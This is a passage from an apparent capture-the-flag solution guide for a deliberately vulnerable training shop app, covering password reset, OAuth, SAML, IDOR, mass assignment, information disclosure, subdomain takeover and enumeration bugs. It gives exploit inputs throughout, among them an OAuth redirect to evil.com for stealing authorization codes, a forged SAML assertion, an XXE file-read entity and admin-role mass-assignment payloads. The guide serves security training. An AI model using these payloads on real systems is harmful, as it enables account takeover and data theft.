          Calculate: md5("admin@bugbountymart.local" + int(time()/3600))

  Medium: Token is random but not invalidated after use.
          Use the same reset link multiple times.

  Hard:   Token expires quickly. Need to intercept email.
          Or use Host Header Injection to steal reset link.

FLAG LOCATION:
  After resetting password, the success page shows:
    "Password updated! Flag: ctf{pwd_reset_...}"
  Or check the reset token — it encodes the flag.

───────────────────────────────────────────────────────────────────────────────
41. OAUTH MISCONFIGURATION
    Flag: ctf{oauth_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /oauth/authorize  → GET parameters: client_id, redirect_uri, scope
  • /oauth/token      → POST parameter: code

HOW TO EXPLOIT:
  Easy:   Missing state parameter. Steal code via redirect:
          /oauth/authorize?redirect_uri=https://evil.com

  Medium: Weak redirect_uri validation:
          /oauth/authorize?redirect_uri=https://bugbountymart.evil.com

  Hard:   Scope escalation:
          /oauth/authorize?scope=admin+read+write
          Or authorization code replay attack.

FLAG LOCATION:
  After stealing the authorization code, exchange it for token.
  The token payload contains: {"flag": "ctf{oauth_...}"}
  Or access /api/user/1 with the token to see the flag.

───────────────────────────────────────────────────────────────────────────────
42. SAML VULNERABILITIES
    Flag: ctf{saml_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /saml/acs         → POST parameter: SAMLResponse

HOW TO EXPLOIT:
  Easy:   No signature validation. Forge SAML response:
          Base64 encode:
          <samlp:Response>
            <saml:Assertion>
              <saml:Subject>
                <saml:NameID>admin</saml:NameID>
              </saml:Subject>
            </saml:Assertion>
          </samlp:Response>

  Medium: XXE in SAML parsing:
          <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>

  Hard:   Assertion wrapping attack.
          Inject malicious assertion into signed envelope.

FLAG LOCATION:
  After successful SAML login, you are authenticated as admin.
  Visit /admin or check session data for the flag.
  The SAML NameID field can contain: admin@flag=ctf{saml_...}

================================================================================
END OF PART 4: AUTHENTICATION BUGS
================================================================================

================================================================================
PART 5: AUTHORIZATION BUGS (4 Vulnerabilities)
================================================================================

───────────────────────────────────────────────────────────────────────────────
43. INSECURE DIRECT OBJECT REFERENCE (IDOR)
    Flag: ctf{idor_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /profile/<id>     → GET parameter: id (user ID)
  • /order/<id>       → GET parameter: id (order ID)

HOW TO EXPLOIT:
  Easy:   /profile/1    (view admin profile)
          /order/1      (view admin orders)
          /order/2      (view other user's order)

  Medium: /profile/1?role=admin  (parameter pollution)
          /order/1.json  (different format, no auth check)

  Hard:   UUID-based IDs but predictable:
          /profile/00000000-0000-0000-0000-000000000001
          Or use mass assignment to change your ID.

FLAG LOCATION:
  The accessed profile or order contains the flag.
  In Easy: Admin profile shows flag in bio field.
  In Medium/Hard: Hidden in order details or API response.

  Check: /profile/1 → bio field contains: ctf{idor_...}

───────────────────────────────────────────────────────────────────────────────
44. ACCESS CONTROL ISSUES
    Flag: ctf{access_ctrl_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /admin            → GET (admin-only page)
  • /admin/ping       → POST (admin-only function)
  • /admin/fetch      → POST (admin-only function)

HOW TO EXPLOIT:
  Easy:   Direct access to /admin without login.
          Or change cookie: role=admin

  Medium: Mass assignment during registration:
          POST /register with role=admin

  Hard:   JWT manipulation to change role to admin.
          Or vertical privilege escalation via API.

FLAG LOCATION:
  The admin panel shows the flag in the dashboard.
  Or after accessing any admin function, the flag appears.

  Check page source: <!-- Admin Flag: ctf{access_ctrl_...} -->

───────────────────────────────────────────────────────────────────────────────
45. MASS ASSIGNMENT
    Flag: ctf{mass_assign_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /register         → POST parameters (accepts extra fields)
  • /api/register     → POST JSON (accepts extra fields)
  • /profile/update   → POST parameters

HOW TO EXPLOIT:
  Easy:   POST /register with hidden fields:
          username=hacker&password=pass&role=admin&is_admin=1

  Medium: POST /api/register with JSON:
          {"username": "hacker", "password": "pass", "role": "admin", "is_admin": 1}

  Hard:   PUT /api/user/1 with:
          {"role": "admin", "is_admin": 1}
          Or use PATCH for partial update.

FLAG LOCATION:
  After mass assignment, login as the new admin user.
  Visit /admin to see the flag.
  Or the registration success message contains the flag.

───────────────────────────────────────────────────────────────────────────────
46. INFORMATION DISCLOSURE
    Flag: ctf{info_disc_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /.git/HEAD        → Exposed git repository
  • /.git/config      → Git config with repo URL
  • /.env             → Environment variables
  • /actuator/env     → Spring Boot actuator (simulated)
  • /backup.sql       → Database backup
  • /swagger          → API documentation
  • /robots.txt       → Hidden paths
  • /sitemap.xml      → Site structure

HOW TO EXPLOIT:
  Easy:   Direct access to all above endpoints.
          /.git/HEAD reveals branch info.
          /.env reveals secrets.

  Medium: Some endpoints hidden or require guessing.
          /actuator/env might be at /admin/actuator.

  Hard:   Error messages are generic.
          Need to use fuzzing to find hidden endpoints.
          Or extract info from stack traces in 500 errors.

FLAG LOCATION:
  The exposed files contain the flag:
  - .env: SECRET_KEY=...
FLAG=ctf{info_disc_...}
  - backup.sql: INSERT INTO flags VALUES ('ctf{info_disc_...}')
  - actuator/env: {"FLAG": "ctf{info_disc_...}"}
  - Error page source: <!-- Flag: ctf{info_disc_...} -->

================================================================================
END OF PART 5: AUTHORIZATION BUGS
================================================================================

================================================================================
PART 6: INFRASTRUCTURE BUGS (2 Vulnerabilities)
================================================================================

───────────────────────────────────────────────────────────────────────────────
47. CLOUD STORAGE MISCONFIGURATION
    Flag: ctf{cloud_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /s3-bucket/<path> → GET (simulated S3 bucket)

HOW TO EXPLOIT:
  Easy:   /s3-bucket/bugbountymart-data
          Returns bucket listing with public access.

  Medium: /s3-bucket/bugbountymart-data?acl
          Check ACL permissions.

  Hard:   /s3-bucket/bugbountymart-data/private/
          Brute force bucket names.
          Or use AWS CLI: aws s3 ls s3://bugbountymart-data

FLAG LOCATION:
  The bucket listing contains files:
    {"contents": ["flag.txt", "config.json", ...]}

  Access the flag file:
    /s3-bucket/bugbountymart-data/flag.txt

  Response: {"content": "ctf{cloud_...}"}

───────────────────────────────────────────────────────────────────────────────
48. SUBDOMAIN TAKEOVER
    Flag: ctf{subdomain_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /subdomain-check  → GET parameter: subdomain

HOW TO EXPLOIT:
  Easy:   /subdomain-check?subdomain=blog.bugbountymart.local
          Returns CNAME pointing to non-existent GitHub Pages.

  Medium: Check DNS records:
          dig CNAME blog.bugbountymart.local
          Points to: nonexistent.github.io

  Hard:   Create GitHub repo named "nonexistent.github.io"
          Add CNAME file: blog.bugbountymart.local
          Claim the subdomain.

FLAG LOCATION:
  The subdomain check response contains:
    {"status": "vulnerable", "message": "...", "flag": "ctf{subdomain_...}"}

  Or after claiming the subdomain, the page shows the flag.

================================================================================
END OF PART 6: INFRASTRUCTURE BUGS
================================================================================

================================================================================
PART 7: WEB ENUMERATION (4 Vulnerabilities)
================================================================================

───────────────────────────────────────────────────────────────────────────────
49. FILES & DIRECTORIES ENUMERATION
    Flag: ctf{files_dirs_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  Hidden files and directories across the site:
  • /.git/            → Git repository
  • /.env             → Environment file
  • /backup.sql       → Database backup
  • /swagger          → API docs
  • /robots.txt       → Disallowed paths
  • /sitemap.xml      → Site map
  • /crossdomain.xml  → Flash cross-domain policy
  • /phpinfo.php      → System info
  • /actuator/        → Spring Boot endpoints

HOW TO EXPLOIT:
  Easy:   Use dirb or gobuster with common wordlist:
          gobuster dir -u http://127.0.0.1:5000 -w common.txt

  Medium: Use ffuf with multiple extensions:
          ffuf -u http://127.0.0.1:5000/FUZZ \
               -w wordlist.txt -e .php,.bak,.sql,.git

  Hard:   Custom wordlists + recursive scanning.
          Check for backup files: index.php.bak, .htaccess.old
          Or use git-dumper to extract full repo.

FLAG LOCATION:
  Hidden files contain the flag:
  - /backup.sql: Search for "flag" or "ctf{" in the dump
  - /.env: FLAG=ctf{files_dirs_...}
  - /robots.txt: Disallow: /secret-flag-page
  - /secret-flag-page: ctf{files_dirs_...}

───────────────────────────────────────────────────────────────────────────────
50. VIRTUAL HOSTS (VHOST) ENUMERATION
    Flag: ctf{vhosts_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /vhost-check      → (checks Host header)

HOW TO EXPLOIT:
  Easy:   Change Host header:
          curl -H "Host: admin.bugbountymart.local" http://127.0.0.1:5000/

  Medium: Use ffuf for vhost brute-forcing:
          ffuf -u http://127.0.0.1:5000 \
               -H "Host: FUZZ.bugbountymart.local" \
               -w vhosts.txt

  Hard:   Use Burp Intruder with Host header fuzzing.
          Check for different responses based on Host.
          Or use DNS enumeration: dnsrecon -d bugbountymart.local

FLAG LOCATION:
  The vhost check response contains:
    {"vhost": "admin.bugbountymart.local", "flag": "ctf{vhosts_...}"}

  Or accessing the vhost reveals a different page with the flag.

───────────────────────────────────────────────────────────────────────────────
51. FUZZING & HTTP PARAMETERS
    Flag: ctf{fuzz_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  Hidden parameters on various endpoints:
  • /api/debug        → GET parameters: debug, admin
  • /profile/update   → POST parameters: role, is_admin
  • /checkout         → POST parameters: total, coupon, discount

HOW TO EXPLOIT:
  Easy:   /api/debug?debug=true
          /api/debug?admin=true

  Medium: Use ParamSpider or Arjun:
          arjun -u http://127.0.0.1:5000/api/debug

          Or use ffuf:
          ffuf -u http://127.0.0.1:5000/api/debug?FUZZ=true \
               -w params.txt

  Hard:   Hidden parameters with unexpected values:
          /checkout?debug=true&internal=true
          /profile/update?override=true

FLAG LOCATION:
  The debug endpoint reveals:
    {"debug": true, "routes": [...], "flag": "ctf{fuzz_...}"}

  Or hidden parameters change behavior:
    /api/debug?admin=true → {"admin_mode": true, "flag": "ctf{fuzz_...}"}

───────────────────────────────────────────────────────────────────────────────
52. DNS ZONE TRANSFER
    Flag: ctf{dns_zone_<difficulty>_<hash>}
───────────────────────────────────────────────────────────────────────────────

WHERE TO FIND:
  • /dns/zone-transfer → GET parameter: domain

HOW TO EXPLOIT:
  Easy:   /dns/zone-transfer?domain=bugbountymart.local
          Returns full DNS zone.

  Medium: Use dig command:
          dig axfr @127.0.0.1 bugbountymart.local

  Hard:   The zone transfer is restricted.
          Need to find secondary nameserver:
          dig ns bugbountymart.local
          dig axfr @ns2.bugbountymart.local bugbountymart.local

FLAG LOCATION:
  The zone transfer response contains:
    {"zone": {"TXT": {"flag": "ctf{dns_zone_...}"}}}

  Or a hidden subdomain is revealed:
    {"A": {"flag-server": "192.168.1.100"}}

  Visit flag-server.bugbountymart.local to get the flag.

================================================================================
END OF PART 7: WEB ENUMERATION
================================================================================



================================================================================
QUICK REFERENCE: ALL VULNERABILITIES & THEIR LOCATIONS
================================================================================

VULNERABILITY                    | ROUTE/PARAMETER                    | METHOD
---------------------------------|------------------------------------|--------
1.  SQLi Error Based             | /login (username, password)        | POST
2.  SQLi Boolean Blind           | /login/blind (username)            | POST
3.  SQLi Time Based              | /login/time (username)             | POST
4.  SQLi Union Based             | /login/union (username)            | POST
5.  Command Injection            | /admin/ping (host)                 | POST
6.  SSTI                         | /admin/greeting (template)           | POST
7.  XXE                          | /order/<id>/export (XML body)       | POST
8.  XXE OOB                      | /order/<id>/export-oob (XML body)   | POST
9.  CRLF Injection               | /crlf-test (next)                    | GET
10. NoSQL Injection              | /api/nosql/login (JSON body)          | POST
11. Deserialization              | /api/deserialize (pickle bytes)     | POST
12. YAML Deserialization         | /api/yaml/load (YAML body)          | POST
13. XPath Injection              | /api/xpath/search (q)                | GET
14. LDAP Injection               | /api/ldap/search (uid)               | GET
15. SSRF                         | /admin/fetch (url)                   | POST
16. SSRF DNS Rebind              | /admin/fetch (url)                   | POST
17. File Upload                  | /profile/upload (avatar)             | POST
18. Path Traversal               | /download (file)                     | GET
19. LFI                          | /admin/view (file)                   | GET
20. RFI                          | /admin/view (file)                   | GET
21. Cache Poisoning              | /cache-poison (X-Custom-Header)      | GET
22. Cache Deception              | /profile/<id>.css                    | GET
23. HTTP Smuggling               | /smuggle-test (body)                 | POST
24. Secondary Context            | /api/user-data (id)                  | GET
25. Race Condition               | /race-coupon (coupon)                | POST
26. XSS Reflected                | /search (q)                          | GET
27. XSS Stored                   | /review/<id> (content)               | POST
28. XSS DOM                      | /product/<id> (#hash)                | GET
29. CSRF                         | /profile/update (bio, email)         | POST
30. Open Redirect                | /redirect (url)                      | GET
31. CSTI                         | /csti-demo (template)                | GET
32. PostMessage                  | /postmessage-demo                    | GET
33. Prototype Pollution          | /api/config (any param)              | GET
34. Clickjacking                 | /clickjacking-demo                   | GET
35. JWT Weak Secret              | /api/jwt/weak                        | POST
36. JWT None Algorithm           | /api/jwt/none                        | POST
37. JWT Key Confusion            | /api/jwt/key-confusion               | POST
38. 2FA Bypass                   | /2fa-verify (code, backup_code)    | POST
39. Brute Force                  | /login/brute (username, password)    | POST
40. Password Reset               | /forgot-password (email)             | POST
41. OAuth Misconfig              | /oauth/authorize (redirect_uri)      | GET
42. SAML Vulnerability           | /saml/acs (SAMLResponse)             | POST
43. IDOR                         | /profile/<id>                        | GET
44. Access Control               | /admin                               | GET
45. Mass Assignment              | /register (role, is_admin)           | POST
46. Information Disclosure       | /.git/HEAD, /.env, /backup.sql       | GET
47. Cloud Storage                | /s3-bucket/<path>                    | GET
48. Subdomain Takeover           | /subdomain-check (subdomain)         | GET
49. Files & Directories          | Multiple hidden endpoints            | GET
50. Virtual Hosts                | /vhost-check (Host header)           | GET
51. Fuzzing & Parameters         | /api/debug (debug, admin)            | GET
52. DNS Zone Transfer            | /dns/zone-transfer (domain)          | GET

================================================================================
END OF QUICK REFERENCE
================================================================================
